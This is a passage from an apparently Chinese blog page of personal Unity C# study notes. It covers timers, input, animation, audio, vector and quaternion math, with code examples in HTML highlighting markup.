技巧：Update中为了同步可以用速度 * 每帧消耗时间</span></span><br><span class="line"><span class="keyword">this</span>.transform.Rotate(<span class="number">0</span>,<span class="number">1</span>*Time.deltaTime,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 倍数，时间缩放，影响FixedUpdate更新速度（0：暂停，1：正常）</span></span><br><span class="line">Time.timeScale;</span><br><span class="line"><span class="comment">// 倍数，不受缩放影响的每帧间隔</span></span><br><span class="line">Time.unscaledDeltaTime;</span><br><span class="line"><span class="comment">// 实际游戏运行时间</span></span><br><span class="line">Time.realtimeSinceStartup;</span><br></pre></td></tr></table></figure><p>方法</p><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 倒计时</span></span><br><span class="line"><span class="comment">// 1.Update 调用，判断当前时间和下一执行时间差。</span></span><br><span class="line"><span class="comment">// （例：发射子弹）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TimeOne</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">float</span> time = Time.time;</span><br><span class="line">    <span class="keyword">if</span> (time &gt; <span class="keyword">this</span>.nextTime &amp;&amp; second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">this</span>.nextTime++;</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.Update 调用，判断每帧累计时间是否达到目标时间。</span></span><br><span class="line"><span class="comment">// （例：蓄力技能）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TimeTwo</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>.countTime += Time.deltaTime;</span><br><span class="line">    <span class="keyword">if</span> ( countTime &gt;= <span class="number">1</span> &amp;&amp; second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">        countTime -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.Start 调用，每固定时间执行一次。（InvokeRepeating）</span></span><br><span class="line"><span class="comment">// （例：固定刷新）</span></span><br><span class="line">InvokeRepeating(<span class="string">&quot;TimeThree&quot;</span>, <span class="number">1</span>, <span class="number">1</span>);  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TimeThree</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        CancelInvoke(<span class="string">&quot;TimeThree&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-Input"><a href="#6-Input" class="headerlink" title="6 Input"></a>6 Input</h3><p>属性</p><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 鼠标按键被按住时返回true（持续，按住时一直返回true）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButton(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 用户按下鼠标第一帧时返回true（单帧）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButtonDown(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 用户释放鼠标第一帧时返回true（单帧）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButtonUP(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 0：左键，1：右键，2：中键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘按键被按住时返回true（</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKey(KeyCode.A);</span><br><span class="line"><span class="comment">// 用户按下键盘按键第一帧时返回true</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKeyDown(KeyCode.A);</span><br><span class="line"><span class="comment">// 用户释放键盘按键第一帧时返回true</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKeyUp(KeyCode.A);</span><br><span class="line"><span class="comment">// KeyCode.*：键盘按钮</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断虚拟轴是否被按下，同理上面，虚拟轴名在InputManage中设置</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButton(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButtonDown(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButtonUp(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 获得虚拟轴名被按下后的值</span></span><br><span class="line"><span class="comment">// 存在中间值的返回，如0-&gt;1过程中返回了0.3</span></span><br><span class="line"><span class="built_in">float</span> <span class="keyword">value</span> = Input.GetAxis(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 只有-1,0,1的返回</span></span><br><span class="line"><span class="built_in">float</span> <span class="keyword">value</span> = Input.GetAxisRaw(<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 按C同时按D（要有一个down，否则会一直执行）</span></span><br><span class="line"><span class="keyword">if</span>(Input.GetKey(KeyCode.C)&amp;&amp;Input.GetKeyDown(KeyCode.D));</span><br></pre></td></tr></table></figure><h3 id="7-其他函数"><a href="#7-其他函数" class="headerlink" title="7 其他函数"></a>7 其他函数</h3><p>唤醒</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 延时后执行。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Invoke</span>(<span class="params"><span class="string">&quot;MethodName&quot;</span> , <span class="string">&quot;time&quot;</span></span>)</span>; </span><br><span class="line"><span class="comment">// 重复执行。（方法，开始时间，间隔（单位秒））</span></span><br><span class="line">InvokeRepeating(<span class="string">&quot;MethodName&quot;</span> , start_time , Repeat_rate );</span><br><span class="line"><span class="comment">// 取消重复。（不填方法名将停止当前脚本所有 Invoke 和 InvokeRepeating 方法）</span></span><br><span class="line">CancelInvoke(<span class="string">&quot;MethodName&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="8-常用API组成功能"><a href="#8-常用API组成功能" class="headerlink" title="8 常用API组成功能"></a>8 常用API组成功能</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得物体材质</span></span><br><span class="line">MeshRenderer meshRenderer = <span class="keyword">this</span>.GetComponent&lt;MeshRenderer&gt;();</span><br><span class="line"><span class="keyword">this</span>.material = meshRenderer.materials[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改颜色</span></span><br><span class="line"><span class="keyword">this</span>.material.color = Color.yellow;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每帧更新,乘deltaTime依渲染移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, moveSpeed * Time.deltaTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不随镜头角度变化的移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,Space.World);</span><br><span class="line"><span class="comment">// 随镜头角度变化的移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,Space.Self);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update中动画要用IsPlaying判断，不能做成else</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(anim.a)&#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(anim.b)&#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="四、动画"><a href="#四、动画" class="headerlink" title="四、动画"></a>四、动画</h2><h3 id="1-UI"><a href="#1-UI" class="headerlink" title="1 UI"></a>1 UI</h3><blockquote><p>using UnityEngine.UI;</p></blockquote><h3 id="2-Animation"><a href="#2-Animation" class="headerlink" title="2 Animation"></a>2 Animation</h3><blockquote><p>脚本控制 Animation 时要把组件中的 Play Automatically 关闭。</p></blockquote><p>属性</p><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// animation是对象，name是动画片段名称</span></span><br><span class="line"><span class="comment">// 是否正在播放</span></span><br><span class="line"><span class="built_in">bool</span> isPlay = anim.isPlaying;</span><br><span class="line"><span class="built_in">bool</span> isPlay = anim.isPlaying(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 立刻播放动画</span></span><br><span class="line">anim.Play(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 播放队列，一个一个播放</span></span><br><span class="line">anim.PlayQueued(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放速度，0不播，1正常，-1倒着播</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].speed = num;</span><br><span class="line"><span class="comment">// 动画总长度</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].length;</span><br><span class="line"><span class="comment">// 当前播放时间</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].time;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 淡入播放name且淡出其他动画</span></span><br><span class="line">anim.animation.CrossFade(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">anim.CrossFadeQueued(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止播放动画</span></span><br><span class="line">anim.stop();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开关门</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseDown</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!doorState) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 开门</span></span><br><span class="line">        door[animName].speed = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 正着播不用设置时间，默认从0开始</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 关门</span></span><br><span class="line">        door[animName].speed = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 默认时间是0，倒着播要设置，否则是0-&gt;0</span></span><br><span class="line">        <span class="comment">// 判断当前不在播放才从尾开始，否则直接当前位置倒着播</span></span><br><span class="line">        <span class="keyword">if</span>(door.isPlaying == <span class="literal">false</span>)</span><br><span class="line">        door[animName].time = door[animName].length;</span><br><span class="line">    &#125;</span><br><span class="line">    door.Play(animName);</span><br><span class="line">    doorState = !doorState;</span><br></pre></td></tr></table></figure><p>异常</p><blockquote><p><a href="https://blog.csdn.net/Prototype___/article/details/124773832">Legacy异常</a></p><p><a href="https://blog.csdn.net/qq_41968782/article/details/110476429">事件没有绑定方法</a></p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Legacy(遗产):2019版本后</span></span><br><span class="line"><span class="number">1.</span>动画——Inspector的Normal改Debug;</span><br><span class="line"><span class="number">2.</span>勾选Legacy;</span><br></pre></td></tr></table></figure><h3 id="3-Animator"><a href="#3-Animator" class="headerlink" title="3 Animator"></a>3 Animator</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Animator animator = GetComponent&lt;Animator&gt;();</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回指定索引（Layers，从0开始）的动画状态机中当前状态的信息</span></span><br><span class="line">animator.GetCurrentAnimatorStateInfo(idx);</span><br><span class="line"><span class="comment">// 返回当前索引对应的动画是否在播放</span></span><br><span class="line">animator.GetCurrentAnimatorStateInfo(idx).IsName(name);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断Base Layer中的Walk动画是否播放</span></span><br><span class="line">animator.GetCurrentAnimatorStateInfo(<span class="number">0</span>).IsName(<span class="string">&quot;Walk&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="4-导入MMD"><a href="#4-导入MMD" class="headerlink" title="4 导入MMD"></a>4 导入MMD</h3><blockquote><ol><li>插件：<a href="http://stereoarts.jp/">Author::Stereoarts Homepage</a></li><li>导入包。</li><li>导入pmx文件包，会在路径下自动生成一个.MMD4Mecanim文件，点击agree</li><li>配置pmx和vmd文件。</li><li>生成了一个可播放物件，该物件右边有一个播放按钮。</li><li>若模型显示不全则进入同名文本文件下修改<code>&lt;commentEn&gt;&lt;/commentEn&gt;</code>中的内容</li></ol></blockquote><h3 id="5-音频"><a href="#5-音频" class="headerlink" title="5 音频"></a>5 音频</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 音频切片</span></span><br><span class="line">audio.clip;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个音频切片（使用则是使用数组索引）</span></span><br><span class="line"><span class="keyword">protected</span> AudioClip[] audioClips;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> audio audioSource = GetComponent&lt;AudioSource&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放音频（一个音频播放完才能播放下一个）</span></span><br><span class="line">audio.Play();</span><br><span class="line"><span class="comment">// 播放音频（上一个音频未播完也可以继续播放下一个）</span></span><br><span class="line">audio.PlayOneShot(audio.clip);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AudioSource audioSource;</span><br><span class="line">audioSource = GetComponent&lt;AudioSource&gt;();</span><br><span class="line"></span><br><span class="line">audioSource.clip = Resources.Load&lt;AudioClip&gt;(<span class="string">&quot;bgm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置音频</span></span><br><span class="line">audioSource.loop = <span class="literal">true</span>;  <span class="comment">// 循环</span></span><br><span class="line">audioSource.volume = <span class="number">0.5f</span>;  <span class="comment">// 声音大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放新音频</span></span><br><span class="line">audioSource.Play();</span><br><span class="line"><span class="comment">// 停止播放</span></span><br><span class="line">audioSource.Stop();</span><br></pre></td></tr></table></figure><hr><h2 id="五、三维数学"><a href="#五、三维数学" class="headerlink" title="五、三维数学"></a>五、三维数学</h2><h3 id="1-Mathf"><a href="#1-Mathf" class="headerlink" title="1 Mathf"></a>1 Mathf</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// π</span></span><br><span class="line">Mathf.PI;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 角度=&gt;弧度</span></span><br><span class="line">radian = angle * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 弧度=&gt;角度</span></span><br><span class="line">angle = radian * Mathf.Rad2Deg;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绝对值</span></span><br><span class="line">Mathf.Abs(num);</span><br><span class="line"><span class="comment">// 次方</span></span><br><span class="line">Mathf.Pow(num,pow);</span><br><span class="line"><span class="comment">// 开方</span></span><br><span class="line">Mathf.Sqrt(num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三角函数（知道一边一角求另一边）</span></span><br><span class="line">Mathf.Sin/Cos/Tan(<span class="built_in">float</span> radian);</span><br><span class="line"><span class="comment">// 反三角函数（知道两边求角）</span></span><br><span class="line">Mathf.Asin/Acos/Atan(<span class="built_in">float</span> radian);</span><br><span class="line"><span class="comment">// 起点向终点移动。起终步长（1f为100%），返回移动后位置</span></span><br><span class="line">point = Mathf.Lerp(start,end,step);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 弧度转</span></span><br><span class="line">radian = angle * Mathf.PI / <span class="number">180</span>;</span><br><span class="line">radian = angle * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 角度转弧度</span></span><br><span class="line">angle = radian * <span class="number">180</span> / Mathf.PI;</span><br><span class="line">angle = radian * Mathf.Rad2Deg;</span><br></pre></td></tr></table></figure><h3 id="2-Vector"><a href="#2-Vector" class="headerlink" title="2 Vector"></a>2 Vector</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态变量</span></span><br><span class="line"><span class="comment">// 简写,向后</span></span><br><span class="line">Vector3.back = <span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="comment">// 依次类推还有</span></span><br><span class="line">forward,back,up,down,left,right,one,zero;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量</span></span><br><span class="line"><span class="comment">// 向量长</span></span><br><span class="line">Vector3.magnitude</span><br><span class="line"><span class="comment">// 单位向量</span></span><br><span class="line">Vector3.normalized</span><br><span class="line"><span class="comment">// 向量长的平方</span></span><br><span class="line">Vector3.sqrMagnitude</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入向量，返回夹角</span></span><br><span class="line">angle = Vector3.Angle(<span class="keyword">from</span>,to);</span><br><span class="line"><span class="comment">// 限制模长，超出了最大值会等比压缩</span></span><br><span class="line">clampedVector = Vector3.ClampMagnitude(inputVector, maxMagnitude);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点乘</span></span><br><span class="line">vector = Vector3.Cross(a,b);</span><br><span class="line"><span class="comment">// 叉乘</span></span><br><span class="line">vector = Vecotr3.Dot(a,b);</span><br><span class="line"><span class="comment">// 向量距离</span></span><br><span class="line">vector = Vecotr3.Distance(a,b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将A标准化并返回两根与A相互垂直的向量</span></span><br><span class="line">vector3.OrthoNormalize(<span class="keyword">ref</span> basisA,<span class="keyword">ref</span> returnB,<span class="keyword">ref</span> returnC);</span><br><span class="line"><span class="comment">// A在平面上的投影</span></span><br><span class="line">vector = Vector3.ProjectOnPlane(A,plane);</span><br><span class="line"><span class="comment">// 反射（入射向量，法线）</span></span><br><span class="line">vector = Vector3.Reflect(inDirection,inNormal);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匀速移动</span></span><br><span class="line">vector = Vector3.MoveTowards(src,dest,speed);</span><br><span class="line"><span class="comment">// 按speed移动</span></span><br><span class="line">vector = Vector3.Lerp(src,dest,speed); <span class="comment">// speed不超过1</span></span><br><span class="line">vector = Vector3.LerpUnclamped(src,dest,speed); <span class="comment">// speed会超过1</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自然的运动</span></span><br><span class="line"><span class="keyword">public</span> AnimationCurve curve; <span class="comment">// 手动绘制曲线</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">float</span> x; <span class="comment">// 曲线x值</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">float</span> duration; <span class="comment">// 持续时间</span></span><br><span class="line"><span class="keyword">if</span>(GUILayout.RepeatButton(<span class="string">&quot;LerpUnclamped&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    x += Time.deltaTime / duration;</span><br><span class="line">    <span class="keyword">this</span>.transform.position = Vector3.LerpUnclamped(Vector3.zero,targetPos,curve.Evaluate(x)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Quaternion"><a href="#3-Quaternion" class="headerlink" title="3 Quaternion"></a>3 Quaternion</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 四元数-&gt;欧拉角</span></span><br><span class="line">Quaternion qt = <span class="keyword">this</span>.transform.rotation;</span><br><span class="line">Vector3 euler = qt.qulerAngles;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 旋转角度为零的单位四元数，用来重置物体的旋转值。</span></span><br><span class="line">Quaternion.identity;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 欧拉角-&gt;四元数</span></span><br><span class="line">rotation = Quaternion.Euler(x,y,z);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 角度差</span></span><br><span class="line"><span class="built_in">float</span> angle = Quaternion.Angle(rotationA, rotationB);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 沿轴旋转</span></span><br><span class="line">rotation = Quaternion.AngleAxis(angle, axis);</span><br><span class="line"><span class="comment">// 注视旋转</span></span><br><span class="line">rotation = Quaternion.LookRotation(position);</span><br><span class="line"><span class="comment">// 匀速旋转</span></span><br><span class="line">Quaternion newRotation = Quaternion.RotateTowards(currentRotation, targetRotation, maxDegreesDelta);</span><br><span class="line"><span class="comment">// 从A转到B</span></span><br><span class="line">rotation = Quaternion.FromToRotation(A,B);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓慢旋转</span></span><br><span class="line"><span class="keyword">if</span>(GUILayout.RepeatButton(<span class="string">&quot;rotation&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    Quaternion dir = Quaternion.LookRotation(tf.position - <span class="keyword">this</span>.transform.position);</span><br><span class="line">    <span class="keyword">this</span>.transform.rotation = Quaternion.Lerp(<span class="keyword">this</span>.transform.position,dir,<span class="number">0.1f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-向量"><a href="#4-向量" class="headerlink" title="4 向量"></a>4 向量</h3><p>属性</p><blockquote><p>二维向量的模长用公式自己算。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原点</span></span><br><span class="line">Vector3.zero;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量平方和的平方根</span></span><br><span class="line"><span class="built_in">float</span> m = vector.magnitude;</span><br><span class="line"><span class="comment">// 向量模平方</span></span><br><span class="line"><span class="built_in">float</span> m = vector.sqrMagnitude;</span><br><span class="line"><span class="comment">// 单位向量，向量方向，归一化，标准化</span></span><br><span class="line">Vector3 n = pos.normalized;</span><br></pre></td></tr></table></figure><p>运算</p><blockquote><p>向量点乘：<script type="math/tex">a*b=|a||b|cos<a,b></script>，反余弦角度在[0,180]之间。</p><p>向量叉乘：<script type="math/tex">a×b=|a||b|sin<a,b></script>，Unity中方向左手规则。反余弦角度在[0,90]之间。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向量相减，各分量相减（结果的起点在原点，加同理。乘除只能对数值操作）</span></span><br><span class="line">Vector3 vector = vector_x - vector_y;</span><br><span class="line"><span class="comment">// 向量点乘，常用于获得夹角（两标准化向量点乘就是夹角的余弦值）（返回值范围0-180）</span></span><br><span class="line"><span class="built_in">float</span> dot = Vector3.Dot(va,vb);</span><br><span class="line"><span class="comment">// 向量叉乘</span></span><br><span class="line">Vector vector = Vector3.Cross(a,b);</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UnityEngine和System.Numerics命名空间都有Vector3，需要明确引用的命名空间</span></span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两点距离</span></span><br><span class="line">Vector3.Distance(a,b);</span><br><span class="line"><span class="comment">// 将向量设为单位向量</span></span><br><span class="line">vector.Normalize();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.求模长的三种方法</span></span><br><span class="line"><span class="built_in">float</span> m = Mathf.Sqrt(Mathf.Pow(pos.x,<span class="number">2</span>)+Mathf.Pow(pos.y,<span class="number">2</span>)+Mathf.Pow(pos.z,<span class="number">2</span>));</span><br><span class="line"><span class="built_in">float</span> m = pos.magnitude; </span><br><span class="line"><span class="built_in">float</span> m = Vector3.Distance(Vector3.zero,pos);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.获取向量的方向</span></span><br><span class="line">Vector3 n = pos / pos.magnitude;</span><br><span class="line">Vector3 n = pos.normalized;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.沿方向移动（避免物体间距产生影响）</span></span><br><span class="line">point.Translate(Direction.normalized);</span><br></pre></td></tr></table></figure><h3 id="5-旋转"><a href="#5-旋转" class="headerlink" title="5 旋转"></a>5 旋转</h3><p>概念</p><blockquote><p>欧拉角：用三个角度来保存方位。（xz轴转沿自身旋转，y轴转沿世界旋转）</p><p>欧拉角的数据类型是Vector3，欧拉角没有大小和方向，仅因为有xyz所以用Vector3存储。</p><p>欧拉角优点：好使方便。</p><p>欧拉角弊端：</p><ol><li><p>方位表达不唯一（[250,0,0]和[290,180,180]是同一个角度）。所以为了保证唯一，用代码操作角度时，x限定在[-90,90]，yz限定[0,360]。</p></li><li><p>万向节死锁。物体沿X轴旋转90度后，自身Z轴会与世界Y轴重合，此时再沿Y或Z旋转时将失去一个自由度。在次情况下，规定沿Y轴完成绕竖直轴的全部旋转，此时Z轴旋转为0。</p></li></ol><p>四元数：3D中表示旋转，旋转都沿自身，分量如下（值域都是[-1,1]）：</p><ul><li><script type="math/tex; mode=display">x=sin(Θ/2)*V.x</script></li><li><script type="math/tex; mode=display">y=sin(Θ/2)*V.y</script></li><li><script type="math/tex; mode=display">z=sin(Θ/2)*V.z</script></li><li><script type="math/tex; mode=display">w=cos(Θ/2)</script></li></ul><p>四元数优点：没有死锁。</p><p>四元数弊端：难用，不建议单独改某个值，存在不合法的四元数值。</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方向向量（没有下左后属性，想获得直接取负）</span></span><br><span class="line"><span class="keyword">this</span>.transform.up;</span><br><span class="line"><span class="keyword">this</span>.transform.right;</span><br><span class="line"><span class="keyword">this</span>.transform.forward;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 欧拉角</span></span><br><span class="line">Vector3 eulerAngle = <span class="keyword">this</span>.transform.eulerAngles;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 四元数</span></span><br><span class="line">Quaternion qt = <span class="keyword">this</span>.transform.rotation;</span><br></pre></td></tr></table></figure><p>运算</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个四元数相乘可以组合旋转效果</span></span><br><span class="line">Quaternion.Euler(<span class="number">0</span>,<span class="number">50</span>,<span class="number">0</span>) = Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * Quaternion.Euler(<span class="number">0</span>,<span class="number">20</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 欧拉角转换成四元数</span></span><br><span class="line"><span class="keyword">this</span>.transform.rotation = Quaternion.Euler(x,y,z);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 四元数原始设置</span></span><br><span class="line"><span class="comment">// 设置旋转轴</span></span><br><span class="line">Vector3 axis = Vector3.up;</span><br><span class="line"><span class="comment">// 设置旋转弧度</span></span><br><span class="line"><span class="built_in">float</span> rad = <span class="number">50</span> * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 设置四元数</span></span><br><span class="line">Quaternion qt = <span class="keyword">new</span> Quaternion();</span><br><span class="line">qt.x = Mathf.Sin(rad / <span class="number">2</span>) * axis.x;</span><br><span class="line">qt.y = Mathf.Sin(rad / <span class="number">2</span>) * axis.y;</span><br><span class="line">qt.z = Mathf.Sin(rad / <span class="number">2</span>) * axis.z;</span><br><span class="line">qt.w = 